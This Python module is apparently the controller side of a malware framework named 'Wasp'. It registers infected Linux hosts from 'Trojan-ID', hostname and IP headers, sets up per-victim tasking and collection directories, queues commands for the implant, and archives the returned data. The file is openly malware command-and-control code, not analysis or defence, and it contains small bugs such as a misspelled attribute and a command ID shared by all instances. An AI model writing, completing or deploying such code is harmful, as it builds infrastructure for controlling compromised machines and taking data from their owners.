#!/usr/bin/env python3
from __future__ import annotations
from datetime import datetime
from enum import Enum
import uuid
import base64
import json
import struct
import logging
from logging import Logger
from pathlib import Path
from typing import Dict, List, Optional, Type
from constants import WASP_HOME, WASPS_PATH, logger
class WaspException(Exception):
    pass

class WaspConnectionType(Enum):
    PRIMARY = "main"
    SECONDARY = "child" # TODO: Maybe child? or secondary? Or fallback

class WaspPlatform(Enum):
    LINUX = "Linux"

class WaspArchitecture(Enum):
    x86_64 = "x86_64"

class WaspCommandMap(object):
    command_map: Dict[str, Type[WaspCommand]] = {}

    def register(self, name: str, command: Type[WaspCommand]):
        self.command_map[name] = command

    def class_for_name(self, name: str) -> Optional[Type[WaspCommand]]:
        return self.command_map.get(name)
        

WASP_COMMAND_MAP = WaspCommandMap()

def WaspCommandClass(clazz: Type[WaspCommand]) -> Type[WaspCommand]:
    """Decorator for registering new commands"""
    WASP_COMMAND_MAP.register(clazz.name, clazz)
    logger.debug(f"Registering command {clazz.name} - {clazz}")
    return clazz

class WaspMalware(object):
    connection_type: WaspConnectionType = WaspConnectionType.PRIMARY
    wasp_id: str

    initial_response: WaspResponse

    hostname: Optional[str] = None
    local_ip: Optional[str] = None
    architecture: Optional[WaspArchitecture] = None
    operating_system: Optional[str] = None
    platform: Optional[WaspPlatform] = None

    wasp_directory: Path
    collection_directory: Path
    tasking_directory: Path
    completed_taskking_directory: Path
    response_directory: Path

    def __init__(self, response: WaspResponse) -> None:
        self.initial_response = response
        meta = response.metadata
        headers = meta.get("headers", {})
        self.connection_type = WaspConnectionType(headers.get("connection-Type", "main"))
        self.wasp_id = headers.get("Trojan-ID", uuid.uuid4())
        self.wasp_directory = WASPS_PATH / str(self.wasp_id)

        self.tasking_directory = self.wasp_directory / "tasking"
        self.tasking_directory.mkdir(parents=True, exist_ok=True)

        self.completed_tasking_directory = self.wasp_directory / "completed_tasking"
        self.completed_tasking_directory.mkdir(parents=True, exist_ok=True)

        self.response_directory = self.wasp_directory / "response"
        self.response_directory.mkdir(parents=True, exist_ok=True)

        self.collection_directory = self.wasp_directory / "collection"
        self.collection_directory.mkdir(parents=True, exist_ok=True)

        self.hostname = headers.get("Trojan-Hostname")
        self.local_ip = headers.get("Trojan-IP")
        self.architecture = WaspArchitecture(headers.get("Trojan-Machine", "Unknown"))
        self.operating_system = headers.get("Trojan-OSersion")
        self.platform = WaspPlatform(headers.get('Trojan-Platform'))

        metadata_path = self.wasp_directory / "wasp.json"
        metadata_path.write_bytes(self.pack())

    def submit_task(self, command: WaspCommand):
        utc_date = datetime.utcnow()
        time_string = utc_date.strftime("%Y%m%d-%H%M%S")
        task_path = self.tasking_directory / f"command-{time_string}-{command.command_id}.json"
        task_path.write_bytes(command.pack())

    def submit_response(self, response: WaspResponse):
        utc_date = datetime.utcnow()
        time_string = utc_date.strftime("%Y%m%d-%H%M%S")
        if response.command:
            command_id = response.command.command_id
            command_type = response.command.name
        else:
            logger.warning(f"Response {response} not associated with command.")
            command_id = str(uuid.uuid4())
            command_type = "unknown"

        task_path = self.response_directory / f"response-{time_string}-{command_type}-{command_id}.json"
        task_path.write_bytes(response.pack())

    def get_tasks(self) -> List[WaspCommand]:
        tasks: List[WaspCommand] = []
        task_paths = list(self.tasking_directory.iterdir())
        for task_path in sorted(task_paths):
            task = WaspCommand.unpack(self, task_path.read_bytes())
            tasks.append(task)
        return tasks

    def has_tasks(self) -> bool:
        return len(self.get_tasks()) > 0

    def get_next_task(self) -> Optional[WaspCommand]:
        tasks = self.get_tasks()
        if len(tasks) > 0:
            return tasks[0]
        return None

    def remove_task(self, command: WaspCommand):
        # TODO: This is not good?? Refactor??
        task_paths = list(self.tasking_directory.iterdir())
        for task_path in sorted(task_paths):
            task = WaspCommand.unpack(self, task_path.read_bytes())
            if task.command_id == command.command_id:
                task_path.unlink()
                break

    def pack(self) -> bytes:
        return self.initial_response.pack()

    @classmethod
    def unpack(cls, packed: bytes) -> WaspMalware:
        unpacked_response = WaspResponse.unpack(packed)
        return WaspMalware(unpacked_response)

    def __str__(self) -> str:
        return self.wasp_id

    def __repr__(self) -> str:
        return f"🐝 Wasp - {self.wasp_id}"


class WaspCommand(object):
    # TODO: Associate response type
    # TODO: Provide callback for response maybe??
    logger: logging.Logger = logger.getChild("WaspCommand")
    wasp: WaspMalware
    command_id: str = str(uuid.uuid4())
    name: str
    responses: List[WaspResponse]
    generated_date: datetime = datetime.utcnow()

    def __init__(self, wasp: WaspMalware) -> None:
        self.wasp = wasp
        self.responses = []

    def get_dict(self) -> Dict:
        raise NotImplementedError()

    @classmethod
    def from_dict(cls, wasp: WaspMalware, source: Dict) -> WaspCommand:
        logger.debug(f"Parsing {cls} from {source}")
        raise NotImplementedError()

    def get_json(self) -> str:
        return json.dumps(self.get_dict())

    def pack(self) -> bytes:
        encoded = self.get_json().encode('utf-8')
        return struct.pack("!I", len(encoded)) + encoded

    @classmethod
    def unpack(cls, wasp: WaspMalware, packed: bytes) -> WaspCommand:
        # Skip the length integer
        json_blob = json.loads(packed[4:])
        uri = json_blob.get("uri")
        if not uri:
            logger.error(f"{json_blob}")
            raise WaspException("No URI, Is this a WaspCommand JSON?")
        command_class = WASP_COMMAND_MAP.class_for_name(uri)
        if command_class:
            logger.debug(f"Selected command class: {uri} - {command_class}")
            return command_class.from_dict(wasp, json_blob)
        raise WaspException("Unimplmented command")

    def __repr__(self) -> str:
        return json.dumps(self.get_dict(), sort_keys=True, indent=2)

    def submit_response(self, response: WaspResponse):
        response.command = self
        self.responses.append(response)
        # Tell the originating wasp about it so it can be archived
        self.wasp.submit_response(response)
        # Handle this response however the particular command type wants
        self.handle_response(response)

    def handle_response(self, response: WaspResponse):
        output: Optional[bytes | str] = None
        try:
            output = response.data.decode('utf-8')
        except UnicodeDecodeError:
            output = base64.b64encode(response.data).decode('utf-8')
        self.logger.info(f"Result: {output}")
        raise NotImplementedError()
    
    def mark_complete(self):
        self.wasp.remove_task(self)

class WaspCommandChunked(WaspCommand):
    def get_data(self) -> bytes:
        raise NotImplementedError()

class WaspResponse(object):
    command: Optional[WaspCommand] = None
    metadata: Dict = {}
    data: bytes = b''

    def __init__(self, metadata: Dict, data: bytes, command: Optional[WaspCommand] = None):
        self.metadata = metadata
        self.data = data
        self.command = command

    def pack(self) -> bytes:
        packed = {
            "data": base64.b64encode(self.data).decode('utf-8'),
            "metadata": self.metadata,
        }
        return json.dumps(packed, indent=2, sort_keys=True).encode('utf-8')

    @classmethod
    def unpack(cls, packed: bytes) -> WaspResponse:
        json_blob = json.loads(packed)
        data = base64.b64decode(json_blob["data"])
        return WaspResponse(metadata=json_blob["metadata"], data=data)
